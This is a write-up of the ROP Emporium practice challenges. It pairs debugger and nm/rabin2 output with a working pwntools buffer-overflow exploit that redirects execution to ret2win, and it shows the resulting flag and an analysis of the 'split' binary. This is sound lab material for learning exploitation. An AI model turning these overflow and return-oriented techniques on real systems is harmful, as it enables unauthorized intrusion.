# Rop Emporium

## 0) Ret2win

### GDB function
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400811  ret2win
0x0000000000400840  __libc_csu_init
0x00000000004008b0  __libc_csu_fini
0x00000000004008b4  _fini
gdb-peda$ 
```
### NM
```
[root:~/Downloads/RopEmporium]# nm ret2win|grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400811 t ret2win
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
# context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("ret2win")

# Variables
pwnme_symbol = p64(elf.symbols["ret2win"])

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += pwnme_symbol

io = elf.process()
# gdb.attach(io)
# https://c9x.me/x86/
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-ret2win-x64.py
[*] '/root/Downloads/RopEmporium/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/ret2win': pid 5018
[+] Receiving all data: Done (322B)
[*] Process '/root/Downloads/RopEmporium/ret2win' stopped with exit code -11 (SIGSEGV) (pid 5018)
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```
## 1)
### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I split
arch     x86
baddr    0x400000
binsz    7137
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
### GDB functions
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  __libc_csu_init
0x0000000000400890  __libc_csu_fini
0x0000000000400894  _fini
```
### NM
```
[root:~/Downloads/RopEmporium]# nm split | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### Analysis
A function exists called usefulFunction, but the string moved into edi is '/bin/ls'
```
gdb-peda$ pdis *usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>:     push   rbp
   0x0000000000400808 <+1>:     mov    rbp,rsp
   0x000000000040080b <+4>:     mov    edi,0x4008ff
   0x0000000000400810 <+9>:     call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:    nop
   0x0000000000400816 <+15>:    pop    rbp
   0x0000000000400817 <+16>:    ret    
End of assembler dump.
gdb-peda$ x/s 0x4008ff
0x4008ff:       "/bin/ls"
gdb-peda$ 
```
### R2 izz
```
036 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt    
```
### GDB string:
```
0x601060 <usefulString>:        "/bin/cat flag.txt"                                                
0x601072 <usefulString+18>:     ""
0x601073 <usefulString+19>:     ""
0x601074 <usefulString+20>:     ""         
0x601075 <usefulString+21>:     ""
0x601076 <usefulString+22>:     ""
0x601077 <usefulString+23>:     ""
0x601078 <usefulString+24>:     ""
0x601079 <usefulString+25>:     ""                             
```
